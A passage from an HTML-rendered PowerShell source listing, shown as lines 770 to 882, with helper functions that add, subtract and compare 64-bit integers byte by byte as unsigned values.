          <td id="L770" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="770"></td>
          <td id="LC770" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Value1</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L771" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="771"></td>
          <td id="LC771" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L772" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="772"></td>
          <td id="LC772" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">1</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L773" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="773"></td>
          <td id="LC773" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Int64</span>]</td>
        </tr>
        <tr>
          <td id="L774" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="774"></td>
          <td id="LC774" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Value2</span></td>
        </tr>
        <tr>
          <td id="L775" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="775"></td>
          <td id="LC775" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L776" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="776"></td>
          <td id="LC776" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L777" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="777"></td>
          <td id="LC777" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Byte</span>[]]<span class="pl-smi">$Value1Bytes</span> <span class="pl-k">=</span> [<span class="pl-k">BitConverter</span>]::GetBytes(<span class="pl-smi">$Value1</span>)</td>
        </tr>
        <tr>
          <td id="L778" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="778"></td>
          <td id="LC778" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Byte</span>[]]<span class="pl-smi">$Value2Bytes</span> <span class="pl-k">=</span> [<span class="pl-k">BitConverter</span>]::GetBytes(<span class="pl-smi">$Value2</span>)</td>
        </tr>
        <tr>
          <td id="L779" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="779"></td>
          <td id="LC779" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Byte</span>[]]<span class="pl-smi">$FinalBytes</span> <span class="pl-k">=</span> [<span class="pl-k">BitConverter</span>]::GetBytes([<span class="pl-k">UInt64</span>]<span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L780" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="780"></td>
          <td id="LC780" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L781" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="781"></td>
          <td id="LC781" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$Value1Bytes<span class="pl-smi">.Count</span></span> <span class="pl-k">-eq</span> <span class="pl-smi">$Value2Bytes<span class="pl-smi">.Count</span></span>)</td>
        </tr>
        <tr>
          <td id="L782" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="782"></td>
          <td id="LC782" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L783" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="783"></td>
          <td id="LC783" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$CarryOver</span> <span class="pl-k">=</span> <span class="pl-c1">0</span></td>
        </tr>
        <tr>
          <td id="L784" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="784"></td>
          <td id="LC784" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">for</span> (<span class="pl-smi">$i</span> <span class="pl-k">=</span> <span class="pl-c1">0</span>; <span class="pl-smi">$i</span> <span class="pl-k">-lt</span> <span class="pl-smi">$Value1Bytes<span class="pl-smi">.Count</span></span>; <span class="pl-smi">$i</span><span class="pl-k">++</span>)</td>
        </tr>
        <tr>
          <td id="L785" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="785"></td>
          <td id="LC785" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L786" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="786"></td>
          <td id="LC786" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$Val</span> <span class="pl-k">=</span> <span class="pl-smi">$Value1Bytes</span>[<span class="pl-smi">$i</span>] <span class="pl-k">-</span> <span class="pl-smi">$CarryOver</span></td>
        </tr>
        <tr>
          <td id="L787" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="787"></td>
          <td id="LC787" class="blob-code blob-code-inner js-file-line">				<span class="pl-c"><span class="pl-c">#</span>Sub bytes</span></td>
        </tr>
        <tr>
          <td id="L788" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="788"></td>
          <td id="LC788" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> (<span class="pl-smi">$Val</span> <span class="pl-k">-lt</span> <span class="pl-smi">$Value2Bytes</span>[<span class="pl-smi">$i</span>])</td>
        </tr>
        <tr>
          <td id="L789" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="789"></td>
          <td id="LC789" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L790" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="790"></td>
          <td id="LC790" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$Val</span> <span class="pl-k">+=</span> <span class="pl-c1">256</span></td>
        </tr>
        <tr>
          <td id="L791" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="791"></td>
          <td id="LC791" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$CarryOver</span> <span class="pl-k">=</span> <span class="pl-c1">1</span></td>
        </tr>
        <tr>
          <td id="L792" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="792"></td>
          <td id="LC792" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L793" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="793"></td>
          <td id="LC793" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L794" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="794"></td>
          <td id="LC794" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L795" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="795"></td>
          <td id="LC795" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$CarryOver</span> <span class="pl-k">=</span> <span class="pl-c1">0</span></td>
        </tr>
        <tr>
          <td id="L796" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="796"></td>
          <td id="LC796" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L797" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="797"></td>
          <td id="LC797" class="blob-code blob-code-inner js-file-line">				</td>
        </tr>
        <tr>
          <td id="L798" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="798"></td>
          <td id="LC798" class="blob-code blob-code-inner js-file-line">				</td>
        </tr>
        <tr>
          <td id="L799" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="799"></td>
          <td id="LC799" class="blob-code blob-code-inner js-file-line">				[<span class="pl-k">UInt16</span>]<span class="pl-smi">$Sum</span> <span class="pl-k">=</span> <span class="pl-smi">$Val</span> <span class="pl-k">-</span> <span class="pl-smi">$Value2Bytes</span>[<span class="pl-smi">$i</span>]</td>
        </tr>
        <tr>
          <td id="L800" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="800"></td>
          <td id="LC800" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L801" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="801"></td>
          <td id="LC801" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$FinalBytes</span>[<span class="pl-smi">$i</span>] <span class="pl-k">=</span> <span class="pl-smi">$Sum</span> <span class="pl-k">-band</span> <span class="pl-c1">0x00FF</span></td>
        </tr>
        <tr>
          <td id="L802" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="802"></td>
          <td id="LC802" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L803" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="803"></td>
          <td id="LC803" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L804" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="804"></td>
          <td id="LC804" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L805" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="805"></td>
          <td id="LC805" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L806" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="806"></td>
          <td id="LC806" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Cannot subtract bytearrays of different sizes<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L807" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="807"></td>
          <td id="LC807" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L808" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="808"></td>
          <td id="LC808" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L809" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="809"></td>
          <td id="LC809" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> [<span class="pl-k">BitConverter</span>]::ToInt64(<span class="pl-smi">$FinalBytes</span><span class="pl-k">,</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L810" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="810"></td>
          <td id="LC810" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L811" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="811"></td>
          <td id="LC811" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L812" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="812"></td>
          <td id="LC812" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L813" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="813"></td>
          <td id="LC813" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Add-SignedIntAsUnsigned</span></td>
        </tr>
        <tr>
          <td id="L814" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="814"></td>
          <td id="LC814" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L815" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="815"></td>
          <td id="LC815" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L816" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="816"></td>
          <td id="LC816" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L817" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="817"></td>
          <td id="LC817" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Int64</span>]</td>
        </tr>
        <tr>
          <td id="L818" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="818"></td>
          <td id="LC818" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Value1</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L819" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="819"></td>
          <td id="LC819" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L820" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="820"></td>
          <td id="LC820" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">1</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L821" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="821"></td>
          <td id="LC821" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Int64</span>]</td>
        </tr>
        <tr>
          <td id="L822" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="822"></td>
          <td id="LC822" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Value2</span></td>
        </tr>
        <tr>
          <td id="L823" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="823"></td>
          <td id="LC823" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L824" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="824"></td>
          <td id="LC824" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L825" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="825"></td>
          <td id="LC825" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Byte</span>[]]<span class="pl-smi">$Value1Bytes</span> <span class="pl-k">=</span> [<span class="pl-k">BitConverter</span>]::GetBytes(<span class="pl-smi">$Value1</span>)</td>
        </tr>
        <tr>
          <td id="L826" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="826"></td>
          <td id="LC826" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Byte</span>[]]<span class="pl-smi">$Value2Bytes</span> <span class="pl-k">=</span> [<span class="pl-k">BitConverter</span>]::GetBytes(<span class="pl-smi">$Value2</span>)</td>
        </tr>
        <tr>
          <td id="L827" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="827"></td>
          <td id="LC827" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Byte</span>[]]<span class="pl-smi">$FinalBytes</span> <span class="pl-k">=</span> [<span class="pl-k">BitConverter</span>]::GetBytes([<span class="pl-k">UInt64</span>]<span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L828" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="828"></td>
          <td id="LC828" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L829" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="829"></td>
          <td id="LC829" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$Value1Bytes<span class="pl-smi">.Count</span></span> <span class="pl-k">-eq</span> <span class="pl-smi">$Value2Bytes<span class="pl-smi">.Count</span></span>)</td>
        </tr>
        <tr>
          <td id="L830" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="830"></td>
          <td id="LC830" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L831" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="831"></td>
          <td id="LC831" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$CarryOver</span> <span class="pl-k">=</span> <span class="pl-c1">0</span></td>
        </tr>
        <tr>
          <td id="L832" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="832"></td>
          <td id="LC832" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">for</span> (<span class="pl-smi">$i</span> <span class="pl-k">=</span> <span class="pl-c1">0</span>; <span class="pl-smi">$i</span> <span class="pl-k">-lt</span> <span class="pl-smi">$Value1Bytes<span class="pl-smi">.Count</span></span>; <span class="pl-smi">$i</span><span class="pl-k">++</span>)</td>
        </tr>
        <tr>
          <td id="L833" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="833"></td>
          <td id="LC833" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L834" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="834"></td>
          <td id="LC834" class="blob-code blob-code-inner js-file-line">				<span class="pl-c"><span class="pl-c">#</span>Add bytes</span></td>
        </tr>
        <tr>
          <td id="L835" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="835"></td>
          <td id="LC835" class="blob-code blob-code-inner js-file-line">				[<span class="pl-k">UInt16</span>]<span class="pl-smi">$Sum</span> <span class="pl-k">=</span> <span class="pl-smi">$Value1Bytes</span>[<span class="pl-smi">$i</span>] <span class="pl-k">+</span> <span class="pl-smi">$Value2Bytes</span>[<span class="pl-smi">$i</span>] <span class="pl-k">+</span> <span class="pl-smi">$CarryOver</span></td>
        </tr>
        <tr>
          <td id="L836" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="836"></td>
          <td id="LC836" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L837" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="837"></td>
          <td id="LC837" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$FinalBytes</span>[<span class="pl-smi">$i</span>] <span class="pl-k">=</span> <span class="pl-smi">$Sum</span> <span class="pl-k">-band</span> <span class="pl-c1">0x00FF</span></td>
        </tr>
        <tr>
          <td id="L838" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="838"></td>
          <td id="LC838" class="blob-code blob-code-inner js-file-line">				</td>
        </tr>
        <tr>
          <td id="L839" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="839"></td>
          <td id="LC839" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> ((<span class="pl-smi">$Sum</span> <span class="pl-k">-band</span> <span class="pl-c1">0xFF00</span>) <span class="pl-k">-eq</span> <span class="pl-c1">0x100</span>)</td>
        </tr>
        <tr>
          <td id="L840" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="840"></td>
          <td id="LC840" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L841" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="841"></td>
          <td id="LC841" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$CarryOver</span> <span class="pl-k">=</span> <span class="pl-c1">1</span></td>
        </tr>
        <tr>
          <td id="L842" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="842"></td>
          <td id="LC842" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L843" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="843"></td>
          <td id="LC843" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L844" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="844"></td>
          <td id="LC844" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L845" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="845"></td>
          <td id="LC845" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$CarryOver</span> <span class="pl-k">=</span> <span class="pl-c1">0</span></td>
        </tr>
        <tr>
          <td id="L846" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="846"></td>
          <td id="LC846" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L847" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="847"></td>
          <td id="LC847" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L848" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="848"></td>
          <td id="LC848" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L849" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="849"></td>
          <td id="LC849" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L850" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="850"></td>
          <td id="LC850" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L851" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="851"></td>
          <td id="LC851" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Cannot add bytearrays of different sizes<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L852" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="852"></td>
          <td id="LC852" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L853" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="853"></td>
          <td id="LC853" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L854" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="854"></td>
          <td id="LC854" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> [<span class="pl-k">BitConverter</span>]::ToInt64(<span class="pl-smi">$FinalBytes</span><span class="pl-k">,</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L855" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="855"></td>
          <td id="LC855" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L856" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="856"></td>
          <td id="LC856" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L857" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="857"></td>
          <td id="LC857" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L858" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="858"></td>
          <td id="LC858" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Compare-Val1GreaterThanVal2AsUInt</span></td>
        </tr>
        <tr>
          <td id="L859" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="859"></td>
          <td id="LC859" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L860" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="860"></td>
          <td id="LC860" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L861" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="861"></td>
          <td id="LC861" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L862" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="862"></td>
          <td id="LC862" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Int64</span>]</td>
        </tr>
        <tr>
          <td id="L863" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="863"></td>
          <td id="LC863" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Value1</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L864" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="864"></td>
          <td id="LC864" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L865" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="865"></td>
          <td id="LC865" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">1</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L866" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="866"></td>
          <td id="LC866" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Int64</span>]</td>
        </tr>
        <tr>
          <td id="L867" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="867"></td>
          <td id="LC867" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Value2</span></td>
        </tr>
        <tr>
          <td id="L868" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="868"></td>
          <td id="LC868" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L869" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="869"></td>
          <td id="LC869" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L870" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="870"></td>
          <td id="LC870" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Byte</span>[]]<span class="pl-smi">$Value1Bytes</span> <span class="pl-k">=</span> [<span class="pl-k">BitConverter</span>]::GetBytes(<span class="pl-smi">$Value1</span>)</td>
        </tr>
        <tr>
          <td id="L871" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="871"></td>
          <td id="LC871" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Byte</span>[]]<span class="pl-smi">$Value2Bytes</span> <span class="pl-k">=</span> [<span class="pl-k">BitConverter</span>]::GetBytes(<span class="pl-smi">$Value2</span>)</td>
        </tr>
        <tr>
          <td id="L872" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="872"></td>
          <td id="LC872" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L873" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="873"></td>
          <td id="LC873" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$Value1Bytes<span class="pl-smi">.Count</span></span> <span class="pl-k">-eq</span> <span class="pl-smi">$Value2Bytes<span class="pl-smi">.Count</span></span>)</td>
        </tr>
        <tr>
          <td id="L874" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="874"></td>
          <td id="LC874" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L875" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="875"></td>
          <td id="LC875" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">for</span> (<span class="pl-smi">$i</span> <span class="pl-k">=</span> <span class="pl-smi">$Value1Bytes<span class="pl-smi">.Count</span></span><span class="pl-k">-</span><span class="pl-c1">1</span>; <span class="pl-smi">$i</span> <span class="pl-k">-ge</span> <span class="pl-c1">0</span>; <span class="pl-smi">$i</span><span class="pl-k">--</span>)</td>
        </tr>
        <tr>
          <td id="L876" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="876"></td>
          <td id="LC876" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L877" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="877"></td>
          <td id="LC877" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> (<span class="pl-smi">$Value1Bytes</span>[<span class="pl-smi">$i</span>] <span class="pl-k">-gt</span> <span class="pl-smi">$Value2Bytes</span>[<span class="pl-smi">$i</span>])</td>
        </tr>
        <tr>
          <td id="L878" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="878"></td>
          <td id="LC878" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L879" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="879"></td>
          <td id="LC879" class="blob-code blob-code-inner js-file-line">					<span class="pl-k">return</span> <span class="pl-c1">$true</span></td>
        </tr>
        <tr>
          <td id="L880" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="880"></td>
          <td id="LC880" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L881" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="881"></td>
          <td id="LC881" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">elseif</span> (<span class="pl-smi">$Value1Bytes</span>[<span class="pl-smi">$i</span>] <span class="pl-k">-lt</span> <span class="pl-smi">$Value2Bytes</span>[<span class="pl-smi">$i</span>])</td>
        </tr>
        <tr>
          <td id="L882" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="882"></td>
